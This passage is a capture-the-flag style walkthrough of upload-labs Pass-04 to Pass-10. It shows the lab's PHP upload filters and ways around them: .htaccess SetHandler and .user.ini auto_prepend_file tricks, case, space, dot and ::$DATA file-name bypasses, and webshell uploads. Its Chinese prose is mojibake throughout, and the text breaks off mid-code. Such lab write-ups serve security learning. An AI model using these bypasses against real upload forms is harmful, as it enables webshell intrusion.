<h2 id="pass-04">Pass-04</h2>
<blockquote>
<p>æœ¬passç¦æ­¢ä¸Šä¼ .php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swfåç¼€æ–‡ä»¶ï¼</p>
</blockquote>
<pre><code class="language-php">$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.ini&quot;);
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA
        $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';
            }
        } else {
            $msg = 'æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !';
        }
    } else {
        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';
    }
}
</code></pre>
<h3 id="é‡å†™è§£æè§„åˆ™">é‡å†™è§£æè§„åˆ™</h3>
<blockquote>
<p>.htaccessæ–‡ä»¶:https://baike.baidu.com/item/htaccess</p>
</blockquote>
<p>ä¸Šä¼ è¦†ç›–.htaccessæ–‡ä»¶ï¼Œé‡å†™è§£æè§„åˆ™ï¼Œå°†ä¸Šä¼ çš„å¸¦é©¬å›¾ç‰‡ä»¥è„šæœ¬çš„æ–¹å¼è§£æã€‚</p>
<p>åˆ›å»º.htaccessæ–‡ä»¶,ä¸ºå¸¦é©¬çš„a.jpgåšphpè§£æ</p>
<pre><code class="language-ini">&lt;FilesMatch &quot;a.jpg&quot;&gt;
SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;
</code></pre>
<p>ä¸Šä¼ WebShell</p>
<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-04%E9%93%BE%E6%8E%A5webShell.png" alt="" loading="lazy"></figure>
<br>
<h2 id="pass-05">Pass-05</h2>
<blockquote>
<p>ä¸Šä¼ ç›®å½•å­˜åœ¨phpæ–‡ä»¶ï¼ˆreadme.phpï¼‰</p>
</blockquote>
<pre><code class="language-php">$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA
        $file_ext = trim($file_ext); //é¦–å°¾å»ç©º
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';
            }
        } else {
            $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼';
        }
    } else {
        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';
    }
}
</code></pre>
<blockquote>
<p>.user.iniæ–‡ä»¶:https://www.php.net/manual/zh/configuration.file.per-user.php</p>
<p>Apache CGIé…ç½®:https://blog.csdn.net/zhuanshu666/article/details/74936940</p>
</blockquote>
<h3 id="æ‰©å±•phpåŠŸèƒ½">æ‰©å±•phpåŠŸèƒ½</h3>
<p>åˆ›å»º.user.iniæ–‡ä»¶,ä½¿å¾—a,jpgçš„phpä»£ç åŠ å…¥ä¸Šä¼ ç›®å½•çš„readme.phpæ–‡ä»¶é‡Œ</p>
<pre><code class="language-ini">auto_prepend_file=a.jpg
</code></pre>
<p>åˆ›å»ºa.jpg</p>
<pre><code class="language-php">&lt;?php
	phpinfo()    
?&gt;
</code></pre>
<h3 id="è®¿é—®readmephp">è®¿é—®readme.php</h3>
<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-05readme.php.png" alt="" loading="lazy"></figure>
<br>
<h2 id="pass-06">Pass-06</h2>
<blockquote>
<p>æœ¬passç¦æ­¢ä¸Šä¼ .php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccessåç¼€æ–‡ä»¶ï¼</p>
</blockquote>
<pre><code class="language-php">$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹
        $file_ext = strrchr($file_name, '.');
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA
        $file_ext = trim($file_ext); //é¦–å°¾å»ç©º

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';
            }
        } else {
            $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼';
        }
    } else {
        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';
    }
}
</code></pre>
<h3 id="å¤§å°å†™ç»•è¿‡é»‘åå•">å¤§å°å†™ç»•è¿‡é»‘åå•</h3>
<p>æœ¬é¢˜æ²¡æœ‰ä½¿ç”¨&quot;strtolower&quot;è¿›è¡Œå¤§å°å†™è½¬æ¢,æ‰€ä»¥å°†a.phpæ”¹ä¸ºa.Php,ä¸Šä¼ webshellå³å¯</p>
<br>
<h2 id="pass-07">Pass-07</h2>
<blockquote>
<p>æœ¬passç¦æ­¢ä¸Šä¼ .php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swfåç¼€æ–‡ä»¶ï¼</p>
</blockquote>
<pre><code class="language-php">$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);
        $file_name = $_FILES['upload_file']['name'];
        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file,$img_path)) {
                $is_upload = true;
            } else {
                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';
            }
        } else {
            $msg = 'æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ';
        }
    } else {
        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';
    }
}
</code></pre>
<h3 id="ç©ºæ ¼ç»•è¿‡">ç©ºæ ¼ç»•è¿‡</h3>
<p>æœ¬é¢˜æ²¡æœ‰ä½¿ç”¨&quot;trim&quot;è¿›è¡Œåˆ é™¤æ–‡ä»¶åçš„å‰åç©ºæ ¼,æ‰€ä»¥å¯ä»¥ä½¿ç”¨ç©ºæ ¼è¿›è¡Œç»•è¿‡</p>
<h3 id="æŠ“å–æ•°æ®åŒ…å¹¶ä¿®æ”¹æ•°æ®-2">æŠ“å–æ•°æ®åŒ…å¹¶ä¿®æ”¹æ•°æ®</h3>
<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-07Burp%E6%8A%93%E5%8C%85.png" alt="" loading="lazy"></figure>
<h3 id="æ³¨æ„">æ³¨æ„</h3>
<p>æœ¬é¢˜ç¯å¢ƒé€‚ç”¨åœ¨Windowsç¯å¢ƒä¸‹,Linuxå¯èƒ½æ— æ³•èƒ½æ­£ç¡®è®¿é—®æœ€ç»ˆç»“æœ,åœ¨Windowsä¸‹ä½¿ç”¨ç©ºæ ¼å‘½å,Windowsä¼šè‡ªåŠ¨åˆ é™¤ç©ºæ ¼</p>
<figure data-type="image" tabindex="12"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Windows%E4%BD%BF%E7%94%A8%E7%A9%BA%E6%A0%BC%E5%91%BD%E5%90%8D.gif" alt="" loading="lazy"></figure>
<br>
<h2 id="pass-08">Pass-08</h2>
<blockquote>
<p>æœ¬passç¦æ­¢ä¸Šä¼ æ‰€æœ‰å¯ä»¥è§£æçš„åç¼€ï¼</p>
</blockquote>
<pre><code class="language-php">$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);
        $file_name = trim($_FILES['upload_file']['name']);
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA
        $file_ext = trim($file_ext); //é¦–å°¾å»ç©º
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';
            }
        } else {
            $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼';
        }
    } else {
        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';
    }
}
</code></pre>
<h3 id="å¥å·ç»•è¿‡">å¥å·(.)ç»•è¿‡</h3>
<p>æœ¬é¢˜æ²¡æœ‰ä½¿ç”¨&quot;deldot&quot;è¿›è¡Œåˆ é™¤æ–‡ä»¶åæœ«å°¾çš„å¥å·,æ‰€ä»¥å¯ä»¥ä½¿ç”¨å¥å·è¿›è¡Œç»•è¿‡</p>
<h3 id="æŠ“å–æ•°æ®åŒ…å¹¶ä¿®æ”¹æ•°æ®-3">æŠ“å–æ•°æ®åŒ…å¹¶ä¿®æ”¹æ•°æ®</h3>
<figure data-type="image" tabindex="13"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-08Burp%E6%8A%93%E5%8C%85.png" alt="" loading="lazy"></figure>
<h3 id="æ³¨æ„-2">æ³¨æ„</h3>
<p>æœ¬é¢˜ç¯å¢ƒé€‚ç”¨åœ¨Windowsç¯å¢ƒä¸‹,Linuxå¯èƒ½æ— æ³•èƒ½æ­£ç¡®è®¿é—®æœ€ç»ˆç»“æœ,åœ¨Windowsä¸‹ä½¿ç”¨å¥å·å‘½å,Windowsä¼šè‡ªåŠ¨åˆ é™¤å¥å·,æ³¨æ„æ˜¯è‹±æ–‡çŠ¶æ€ä¸‹çš„å¥å·,æœ¬é¢˜æ–¹æ³•ä¸ç¬¬ä¸ƒé¢˜å¤§åŒå°å¼‚</p>
<br>
<h2 id="pass-09">Pass-09</h2>
<blockquote>
<p>æœ¬passç¦æ­¢ä¸Šä¼ .php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccessåç¼€æ–‡ä»¶ï¼</p>
</blockquote>
<pre><code class="language-php">$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™
        $file_ext = trim($file_ext); //é¦–å°¾å»ç©º
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';
            }
        } else {
            $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼';
        }
    } else {
        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';
    }
}
</code></pre>
<blockquote>
<p>NTFSæ–‡ä»¶ç³»ç»Ÿçš„ADS:https://www.qingsword.com/qing/812.html</p>
</blockquote>
<h3 id="dataç»•è¿‡">::$DATAç»•è¿‡</h3>
<p>æ²¡æœ‰å¯¹<code>::$DATA</code>è¿›è¡Œè¿‡æ»¤,æ‰€ä»¥å¯ä»¥é€šè¿‡::$DATAè¿›è¡Œç»•è¿‡</p>
<h3 id="æŠ“å–æ•°æ®åŒ…å¹¶ä¿®æ”¹æ•°æ®-4">æŠ“å–æ•°æ®åŒ…å¹¶ä¿®æ”¹æ•°æ®</h3>
<figure data-type="image" tabindex="14"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-09burp%E6%8A%93%E5%8C%85.png" alt="" loading="lazy"></figure>
<h3 id="è®¿é—®">è®¿é—®</h3>
<pre><code class="language-hrml">è®¿é—®çš„æ—¶å€™å°†ä¼šå‡ºç°403çš„æƒ…å†µ,åªè¦å°†Urlçš„::$dataå»æ‰å³å¯(ä¸Šä¼ çš„æ–‡ä»¶åå­—ä¸å­˜åœ¨::$data)
åŸUrl:http://192.168.78.101/upload/upload/202007191638081519.php::$data
æ–°Url:http://192.168.78.101/upload/upload/202007191638081519.php

</code></pre>
<h3 id="æ³¨æ„-3">æ³¨æ„</h3>
<p>æœ¬é¢˜ç¯å¢ƒé€‚ç”¨åœ¨Windowsç¯å¢ƒä¸”æ–‡ä»¶ç³»ç»Ÿæ˜¯NTFSä¸‹,Linuxå¯èƒ½æ— æ³•èƒ½æ­£ç¡®è®¿é—®æœ€ç»ˆç»“æœ,åœ¨Windowsçš„NTFSæ–‡ä»¶ç³»ç»Ÿæœ‰ä¸€ä¸ªç‰¹æ€§,NTFSæ–‡ä»¶ç³»ç»Ÿçš„æ•°æ®å­˜å‚¨<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mi mathvariant="normal">æ•°</mi><mi mathvariant="normal">æ®</mi><mi mathvariant="normal">æµ</mi><mo separator="true">,</mo><mi mathvariant="normal">æˆ‘</mi><mi mathvariant="normal">ä»¬</mi><mi mathvariant="normal">å†™</mi><mi mathvariant="normal">çš„</mi><mi mathvariant="normal">ä¾‹</mi><mi mathvariant="normal">å­</mi><mi mathvariant="normal">æ˜¯</mi><mi mathvariant="normal">â€˜</mi><mi mathvariant="normal">â€œ</mi><mi>a</mi><mi mathvariant="normal">.</mi><mi>p</mi><mi>h</mi><mi>p</mi><mi mathvariant="normal">â€</mi><mi mathvariant="normal">â€˜</mi><mi mathvariant="normal">ï¼Œ</mi><mi mathvariant="normal">æˆ‘</mi><mi mathvariant="normal">ä»¬</mi><mi mathvariant="normal">åœ¨</mi><mi mathvariant="normal">å®</mi><mi mathvariant="normal">é™…</mi><mi mathvariant="normal">å†™</mi><mi mathvariant="normal">å…¥</mi><mi mathvariant="normal">çš„</mi><mi mathvariant="normal">æ˜¯</mi><mi mathvariant="normal">â€˜</mi><mi>a</mi><mi mathvariant="normal">.</mi><mi>p</mi><mi>h</mi><mi>p</mi><mo>:</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">DATAæ•°æ®æµ,æˆ‘ä»¬å†™çš„ä¾‹å­æ˜¯`â€œa.phpâ€`ï¼Œæˆ‘ä»¬åœ¨å®é™…å†™å…¥çš„æ˜¯`a.php::</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">A</span><span class="mord cjk_fallback">æ•°</span><span class="mord cjk_fallback">æ®</span><span class="mord cjk_fallback">æµ</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">æˆ‘</span><span class="mord cjk_fallback">ä»¬</span><span class="mord cjk_fallback">å†™</span><span class="mord cjk_fallback">çš„</span><span class="mord cjk_fallback">ä¾‹</span><span class="mord cjk_fallback">å­</span><span class="mord cjk_fallback">æ˜¯</span><span class="mord">â€˜</span><span class="mord">â€œ</span><span class="mord mathdefault">a</span><span class="mord">.</span><span class="mord mathdefault">p</span><span class="mord mathdefault">h</span><span class="mord mathdefault">p</span><span class="mord">â€</span><span class="mord">â€˜</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">æˆ‘</span><span class="mord cjk_fallback">ä»¬</span><span class="mord cjk_fallback">åœ¨</span><span class="mord cjk_fallback">å®</span><span class="mord cjk_fallback">é™…</span><span class="mord cjk_fallback">å†™</span><span class="mord cjk_fallback">å…¥</span><span class="mord cjk_fallback">çš„</span><span class="mord cjk_fallback">æ˜¯</span><span class="mord">â€˜</span><span class="mord mathdefault">a</span><span class="mord">.</span><span class="mord mathdefault">p</span><span class="mord mathdefault">h</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span></span></span></span>DATA`(æ•°æ®æµåç§°ä¸ºç©º,ä¸¤ä¸ªå†’å·ä¹‹é—´ä¸ºåç§°ä½ç½®)</p>
<br>
<h2 id="pass-10">Pass-10</h2>
<blockquote>
<p>æœ¬passåªå…è®¸ä¸Šä¼ .jpg|.png|.gifåç¼€çš„æ–‡ä»¶ï¼</p>
</blockquote>
<pre><code class="language-shell">$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot